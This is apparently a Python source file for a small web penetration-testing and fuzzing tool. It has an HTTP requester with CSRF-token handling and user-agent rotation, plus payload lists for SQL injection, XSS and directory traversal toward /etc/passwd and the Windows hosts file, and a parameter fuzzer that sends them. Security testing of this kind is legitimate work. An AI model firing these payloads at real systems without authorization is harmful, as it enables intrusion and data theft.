"""
fuzzy core - by æ’’
educational penetration testing tool for authorized environments only
"""
from typing import Dict, List, Optional, Union, Any
from urllib.parse import urljoin, urlparse
from colorama import Fore, Style, init
from bs4 import BeautifulSoup
import threading
import requests
import sqlite3
import asyncio
import aiohttp
import random
import json
import time


init(autoreset=True)
class fuzzyRequester:
    def __init__(self, base_url: str = "", headers: Dict[str, str] = None, 
                 cookies: Dict[str, str] = None, proxies: Dict[str, str] = None,
                 timeout: int = 30, verify_ssl: bool = True, verbose: bool = True):
        
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.verbose = verbose
        self.request_count = 0
        self.csrf_token = None
        
        default_headers = {
            'User-Agent': 'fuzzy/1.0 (Ethical Security Testing)',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        }
        
        if headers:
            default_headers.update(headers)
        
        self.session.headers.update(default_headers)
        
        if cookies:
            self.session.cookies.update(cookies)
            
        if proxies:
            self.session.proxies.update(proxies)
    
    def _log(self, message: str, level: str = "INFO"):
        if not self.verbose:
            return
            
        colors = {
            "INFO": Fore.CYAN,
            "SUCCESS": Fore.GREEN,
            "WARNING": Fore.YELLOW,
            "ERROR": Fore.RED,
            "DEBUG": Fore.MAGENTA
        }
        
        color = colors.get(level, Fore.WHITE)
        timestamp = time.strftime("%H:%M:%S")
        print(f"{color}[{timestamp}] [{level}] {message}{Style.RESET_ALL}")
    
    def _build_url(self, endpoint: str) -> str:
        if endpoint.startswith(('http://', 'https://')):
            return endpoint
        return urljoin(self.base_url + '/', endpoint.lstrip('/'))
    
    def _extract_csrf_token(self, response: requests.Response) -> Optional[str]:
        try:
            soup = BeautifulSoup(response.text, 'html.parser')
            
            csrf_patterns = [
                {'name': 'csrf-token'},
                {'name': '_token'},
                {'name': 'authenticity_token'},
                {'id': 'csrf_token'},
                {'class': 'csrf-token'}
            ]
            
            for pattern in csrf_patterns:
                token_input = soup.find('input', pattern)
                if token_input and token_input.get('value'):
                    return token_input['value']
                    
            meta_csrf = soup.find('meta', {'name': 'csrf-token'})
            if meta_csrf and meta_csrf.get('content'):
                return meta_csrf['content']
                
        except Exception as e:
            self._log(f"csrf token extraction failed: {e}", "WARNING")
        
        return None
    
    def set_proxy(self, proxy_url: str):
        self.session.proxies.update({
            'http': proxy_url,
            'https': proxy_url
        })
        self._log(f"proxy set to: {proxy_url}")
    
    def add_header(self, key: str, value: str):
        self.session.headers[key] = value
        self._log(f"header added: {key}: {value}")
    
    def add_cookie(self, key: str, value: str):
        self.session.cookies[key] = value
        self._log(f"cookie added: {key}: {value}")
    
    def randomize_user_agent(self):
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101',
            'fuzzy/1.0 (Ethical Security Testing Framework)'
        ]
        
        selected_ua = random.choice(user_agents)
        self.session.headers['User-Agent'] = selected_ua
        self._log(f"user-agent randomized: {selected_ua}")
    
    def _make_request(self, method: str, url: str, **kwargs) -> requests.Response:
        self.request_count += 1
        full_url = self._build_url(url)
        
        if self.csrf_token and method.upper() in ['POST', 'PUT', 'PATCH', 'DELETE']:
            if 'data' in kwargs and isinstance(kwargs['data'], dict):
                kwargs['data']['_token'] = self.csrf_token
            elif 'json' in kwargs and isinstance(kwargs['json'], dict):
                kwargs['json']['_token'] = self.csrf_token
        
        self._log(f"request #{self.request_count}: {method.upper()} {full_url}")
        
        try:
            start_time = time.time()
            response = self.session.request(
                method=method.upper(),
                url=full_url,
                timeout=self.timeout,
                verify=self.verify_ssl,
                **kwargs
            )
            
            elapsed_time = round((time.time() - start_time) * 1000, 2)
            
            status_color = Fore.GREEN if 200 <= response.status_code < 300 else \
                          Fore.YELLOW if 300 <= response.status_code < 400 else Fore.RED
            
            self._log(f"response: {status_color}{response.status_code}{Style.RESET_ALL} "
                     f"({elapsed_time}ms) - {len(response.content)} bytes")
            return response
            
        except requests.exceptions.RequestException as e:
            self._log(f"request failed: {e}", "ERROR")
            raise
    
    def get(self, url: str, params: Dict = None, **kwargs) -> requests.Response:
        return self._make_request('GET', url, params=params, **kwargs)
    
    def post(self, url: str, data: Union[Dict, str] = None, json: Dict = None, 
             auto_token: bool = False, **kwargs) -> requests.Response:
        if auto_token:
            try:
                get_response = self.get(url)
                self.csrf_token = self._extract_csrf_token(get_response)
                if self.csrf_token:
                    self._log(f"csrf token extracted: {self.csrf_token[:20]}...")
            except Exception as e:
                self._log(f"auto-token extraction failed: {e}", "WARNING")
        
        return self._make_request('POST', url, data=data, json=json, **kwargs)
    
    def put(self, url: str, data: Union[Dict, str] = None, json: Dict = None, **kwargs) -> requests.Response:
        return self._make_request('PUT', url, data=data, json=json, **kwargs)
    
    def delete(self, url: str, **kwargs) -> requests.Response:
        return self._make_request('DELETE', url, **kwargs)
    
    def patch(self, url: str, data: Union[Dict, str] = None, json: Dict = None, **kwargs) -> requests.Response:
        return self._make_request('PATCH', url, data=data, json=json, **kwargs)
    
    def pretty_json(self, response: requests.Response) -> str:
        try:
            return json.dumps(response.json(), indent=2, ensure_ascii=False)
        except (json.JSONDecodeError, ValueError):
            return "response is not valid json"
    
    def pretty_html(self, response: requests.Response) -> str:
        try:
            soup = BeautifulSoup(response.text, 'html.parser')
            return soup.prettify()
        except Exception:
            return response.text
    
    def save_response(self, response: requests.Response, filename: str):
        with open(filename, 'w', encoding='utf-8') as f:
            if 'application/json' in response.headers.get('content-type', ''):
                f.write(self.pretty_json(response))
            else:
                f.write(response.text)
        
        self._log(f"response saved to: {filename}")


class fuzzyPayloads:
    @staticmethod
    def sql_injection_basic() -> List[str]:
        return [
            "' OR '1'='1",
            "' OR 1=1 --",
            "' OR 1=1 #",
            "admin'--",
            "admin'/*",
            "' OR 'x'='x",
            "') OR ('1'='1",
            "' OR 1=1 LIMIT 1 --",
            "1' OR '1'='1' --",
            "' UNION SELECT NULL --"
        ]
    @staticmethod
    def xss_basic() -> List[str]:
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>"
        ]
    
    @staticmethod
    def directory_traversal() -> List[str]:
        return [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "/var/www/../../etc/passwd",
            "....\\....\\....\\windows\\system32\\drivers\\etc\\hosts"
        ]


class fuzzyFuzzer:
    def __init__(self, requester: fuzzyRequester):
        self.requester = requester
        self.results = []
    
    def fuzz_parameters(self, url: str, param_name: str, payloads: List[str], 
                       method: str = 'GET') -> List[Dict]:
        """fuzz specific parameter with given payloads"""
        results = []
        
        for i, payload in enumerate(payloads, 1):
            self.requester._log(f"fuzzing {i}/{len(payloads)}: {param_name}={payload[:50]}...")
            
            try:
                if method.upper() == 'GET':
                    response = self.requester.get(url, params={param_name: payload})
                elif method.upper() == 'POST':
                    response = self.requester.post(url, data={param_name: payload})
                else:
                    continue
                
                result = {
                    'payload': payload,
                    'status_code': response.status_code,
                    'response_length': len(response.content),
                    'response_time': response.elapsed.total_seconds()
                }
                
                results.append(result)
                time.sleep(0.1)
                
            except Exception as e:
                self.requester._log(f"fuzzing error with payload '{payload}': {e}", "ERROR")
        
        return results


def enhance_response(response: requests.Response):
    def pretty_json(self):
        try:
            return json.dumps(self.json(), indent=2, ensure_ascii=False)
        except:
            return "response is not valid json"
    
    def pretty_html(self):
        try:
            soup = BeautifulSoup(self.text, 'html.parser')
            return soup.prettify()
        except:
            return self.text
    
    def extract_forms(self):
        """extract all forms from html response"""
        try:
            soup = BeautifulSoup(self.text, 'html.parser')
            forms = []
            
            for form in soup.find_all('form'):
                form_data = {
                    'action': form.get('action', ''),
                    'method': form.get('method', 'GET').upper(),
                    'inputs': []
                }
                
                for input_tag in form.find_all('input'):
                    form_data['inputs'].append({
                        'name': input_tag.get('name', ''),
                        'type': input_tag.get('type', 'text'),
                        'value': input_tag.get('value', '')
                    })
                
                forms.append(form_data)
            
            return forms
        except:
            return []
    
    response.pretty_json = pretty_json.__get__(response)
    response.pretty_html = pretty_html.__get__(response)
    response.extract_forms = extract_forms.__get__(response)
    
    return response

original_request = requests.Session.request

def enhanced_request(self, *args, **kwargs):
    response = original_request(self, *args, **kwargs)
    return enhance_response(response)

requests.Session.request = enhanced_request
